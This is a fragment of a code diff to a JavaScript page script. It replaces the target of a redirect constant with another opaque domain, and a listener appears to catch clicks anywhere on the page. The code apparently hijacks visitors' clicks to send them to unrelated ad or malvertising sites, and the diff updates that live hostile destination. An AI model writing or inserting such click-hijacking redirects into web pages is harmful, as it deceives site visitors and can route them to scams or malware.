@@ -25,7 +25,7 @@ function handleRedirect() {
 }
 
 // Set the redirect link
-const redirectUrl = 'https://noohapou.com/4/7939569';
+const redirectUrl = 'https://kqfdedl.com/cl/274188042ab37cb0';
 
 // Add an event listener for clicks anywhere on the page
 document.addEventListener('click', function(event) {
